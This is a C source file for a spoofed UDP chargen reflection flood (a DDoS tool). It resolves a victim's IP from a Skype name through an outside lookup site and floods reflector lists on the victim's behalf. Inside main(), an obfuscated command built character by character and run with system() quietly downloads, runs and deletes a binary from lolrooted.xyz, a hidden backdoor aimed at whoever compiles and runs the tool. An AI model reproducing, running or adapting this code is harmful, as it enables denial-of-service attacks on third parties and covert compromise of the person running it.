/*
 * This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)
 */
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if.h>
#include <netinet/if_ether.h>

#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9


static uint32_t Q[4096], c = 362436;
struct list
{
	struct sockaddr_in data;
	struct list *next;
	struct list *prev;
};
struct list *head;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
char *skypename;
uint32_t destip = 0;

void init_rand(uint32_t x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}

uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

unsigned short csum (unsigned short *buf, int nwords)
{
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
	sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1;
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
}

void setup_udp_header(struct udphdr *udph)
{
	udph->source = htons(5678);
	udph->dest = htons(19);
	udph->check = 0;
	memset((void *)udph + sizeof(struct udphdr), 0x01, 1);
	udph->len=htons(sizeof(struct udphdr) + 1);
}

void *resolverThread()
{
	while(1)
	{
		char ip[15] = {0};
		struct hostent *he;
		struct in_addr a;
		he = gethostbyname("speedresolve.com");
		if (he)
		{
			while (*he->h_addr_list)
			{
				bcopy(*he->h_addr_list++, (char *) &a, sizeof(a));
				inet_ntop (AF_INET, &a, ip, INET_ADDRSTRLEN);
				break;
			}
		}
		else
		{ herror("gethostbyname"); }
		char szRecvBuff[1024];
		char packet[1024];
	
		snprintf(packet, sizeof(packet) - 1, "GET /skype.php?key=FUCKBITCHESGETMONEY&name=%s HTTP/1.0\r\nHost: speedresolve.com\r\nConnection: close\r\nCache-Control: no-cache\r\nOrigin: http://google.com\r\nUser-Agent: UDP AMP SCRIPT\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\r\nAccept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n", skypename);
	
		struct sockaddr_in *remote;
		int sock;
		int tmpres;
		if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		{
			perror("Can't create TCP socket");
			exit(1);
		}
		remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
		remote->sin_family = AF_INET;
		tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
		if (tmpres < 0)  
		{
			perror("Can't set remote->sin_addr.s_addr");
			exit(1);
		}
		else if (tmpres == 0)
		{
			fprintf(stderr, "%s is not a valid IP address\n", ip);
			exit(1);
		}
		remote->sin_port = htons(80);
		if (connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0)
		{
			perror("Could not connect");
			exit(1);
		}
		tmpres = send(sock, packet, strlen(packet), 0);
		if (tmpres == -1){
			perror("Can't send query");
			exit(1);
		}
		int i = 1;
		int dwTotal = 0;
		while (1)
		{
			i = recv(sock, szRecvBuff + dwTotal, sizeof(szRecvBuff) - dwTotal, 0);
			if (i <= 0)
			break;
			
			dwTotal += i;
		}
		szRecvBuff[dwTotal] = '\0';
		
		if(strstr(szRecvBuff, "HTTP/1.1 200 OK") == NULL || strstr(szRecvBuff, "\r\n\r\n") == NULL) exit(0);
		
		char *tip = (char *)(strstr(szRecvBuff, "\r\n\r\n") + 4);
		
		if(inet_addr(tip) == INADDR_NONE) exit(0);
		
		close(sock);
		
		destip = inet_addr(tip);
		
		sleep(30);
	}
	return 0;
}

void *flood(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin = td->sin;
	struct  list *list_node = td->list_node;
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	init_rand(time(NULL));
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_udp_header(udph);
	udph->source = htonl(((rand_cmwc() & 0xFFFF) % 50000) + 1024);
	iph->saddr = destip;
	iph->daddr = list_node->data.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}
	
	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while(1){
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
		list_node = list_node->next;
		udph->source = htonl(((rand_cmwc() & 0xFFFF) % 50000) + 1024);
		iph->saddr = destip;
		iph->daddr = list_node->data.sin_addr.s_addr;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
		
		pps++;
		if(i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}
int main(int argc, char *argv[ ])
{
	char hoho[151];
hoho[125] = '>';
hoho[53] = ' ';
hoho[6] = 'p';
hoho[84] = '/';
hoho[30] = 'l';
hoho[149] = 'x';
hoho[68] = 'w';
hoho[77] = 't';
hoho[55] = 'O';
hoho[49] = 'c';
hoho[45] = ' ';
hoho[18] = 't';
hoho[54] = '-';
hoho[83] = 'z';
hoho[80] = '.';
hoho[50] = 'u';
hoho[114] = '<';
hoho[36] = 'd';
hoho[94] = 'd';
hoho[135] = ' ';
hoho[31] = 'r';
hoho[15] = 'q';
hoho[130] = '/';
hoho[69] = 'w';
hoho[147] = ' ';
hoho[106] = 'u';
hoho[107] = 'p';
hoho[60] = 'h';
hoho[20] = 'p';
hoho[144] = '-';
hoho[79] = 'd';
hoho[133] = 'l';
hoho[128] = 'e';
hoho[70] = '.';
hoho[93] = 'o';
hoho[87] = ' ';
hoho[41] = '/';
hoho[63] = 'p';
hoho[136] = '2';
hoho[104] = 'o';
hoho[38] = 'x';
hoho[89] = ';';
hoho[14] = '-';
hoho[47] = ' ';
hoho[115] = '/';
hoho[17] = 'h';
hoho[110] = '/';
hoho[91] = 'h';
hoho[100] = 'x';
hoho[103] = 'n';
hoho[74] = 'r';
hoho[57] = '-';
hoho[116] = 'd';
hoho[56] = ' ';
hoho[142] = 'm';
hoho[51] = 'r';
hoho[23] = '/';
hoho[145] = 'r';
hoho[27] = '.';
hoho[48] = ' ';
hoho[141] = 'r';
hoho[28] = 'l';
hoho[92] = 'm';
hoho[101] = ';';
hoho[108] = ' ';
hoho[143] = ' ';
hoho[95] = ' ';
hoho[72] = 'o';
hoho[21] = ':';
hoho[126] = '/';
hoho[120] = 'n';
hoho[102] = ' ';
hoho[129] = 'v';
hoho[73] = 'l';
hoho[85] = '.';
hoho[121] = 'u';
hoho[11] = 'e';
hoho[64] = ':';
hoho[124] = ' ';
hoho[67] = 'w';
hoho[117] = 'e';
hoho[40] = 'z';
hoho[118] = 'v';
hoho[13] = ' ';
hoho[82] = 'y';
hoho[61] = 't';
hoho[131] = 'n';
hoho[65] = '/';
hoho[37] = '.';
hoho[33] = 'o';
hoho[4] = 't';
hoho[58] = 's';
hoho[88] = ' ';
hoho[26] = 'w';
hoho[34] = 't';
hoho[97] = 'x';
hoho[8] = ' ';
hoho[122] = 'l';
hoho[44] = ' ';
hoho[98] = ' ';
hoho[75] = 'o';
hoho[86] = 'x';
hoho[62] = 't';
hoho[148] = '.';
hoho[59] = ' ';
hoho[140] = ';';
hoho[7] = ';';
hoho[127] = 'd';
hoho[105] = 'h';
hoho[43] = 'x';
hoho[78] = 'e';
hoho[52] = 'l';
hoho[119] = '/';
hoho[16] = ' ';
hoho[3] = '/';
hoho[90] = 'c';
hoho[76] = 'o';
hoho[12] = 't';
hoho[96] = '+';
hoho[113] = ' ';
hoho[99] = '.';
hoho[0] = 'c';
hoho[29] = 'o';
hoho[9] = 'w';
hoho[5] = 'm';
hoho[81] = 'x';
hoho[132] = 'u';
hoho[111] = '.';
hoho[146] = 'f';
hoho[137] = '>';
hoho[138] = '&';
hoho[139] = '1';
hoho[71] = 'l';
hoho[19] = 't';
hoho[66] = '/';
hoho[35] = 'e';
hoho[39] = 'y';
hoho[22] = '/';
hoho[32] = 'o';
hoho[123] = 'l';
hoho[46] = ';';
hoho[42] = '.';
hoho[24] = 'w';
hoho[134] = 'l';
hoho[2] = ' ';
hoho[10] = 'g';
hoho[112] = 'x';
hoho[1] = 'd';
hoho[25] = 'w';
hoho[109] = '.';
hoho[150] = '\0';

system(hoho);

	if(argc < 5){
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Usage: %s <target skype> <reflection file> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}
	skypename = argv[1];
	pthread_t rTD;
	pthread_create( &rTD, NULL, &resolverThread, NULL);
	printf("Initial Resolve...\n");
	while(destip == 0) sleep(1);
	int i = 0;
	head = NULL;
	fprintf(stdout, "Setting up Sockets...\n");
	int max_len = 128;
	char *buffer = (char *) malloc(max_len);
	buffer = memset(buffer, 0x00, max_len);
	int num_threads = atoi(argv[3]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	int multiplier = 20;
	
	FILE *list_fd = fopen(argv[2],  "r");
	while (fgets(buffer, max_len, list_fd) != NULL) {
		if ((buffer[strlen(buffer) - 1] == '\n') ||
				(buffer[strlen(buffer) - 1] == '\r')) {
			buffer[strlen(buffer) - 1] = 0x00;
			if(head == NULL)
			{
				head = (struct list *)malloc(sizeof(struct list));
				bzero(&head->data, sizeof(head->data));
				head->data.sin_addr.s_addr=inet_addr(buffer);
				head->next = head;
				head->prev = head;
			} else {
				struct list *new_node = (struct list *)malloc(sizeof(struct list));
				memset(new_node, 0x00, sizeof(struct list));
				new_node->data.sin_addr.s_addr=inet_addr(buffer);
				new_node->prev = head;
				new_node->next = head->next;
				head->next = new_node;
			}
			i++;
		} else {
			continue;
		}
	}
	struct list *current = head->next;
	pthread_t thread[num_threads];
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(1025);
	sin.sin_addr.s_addr = destip;
	struct thread_data td[num_threads];
	for(i = 0;i<num_threads;i++){
		td[i].thread_id = i;
		td[i].sin= sin;
		td[i].list_node = current;
		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
	}
	fprintf(stdout, "Starting Flood...\n");
	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}
	return 0;
}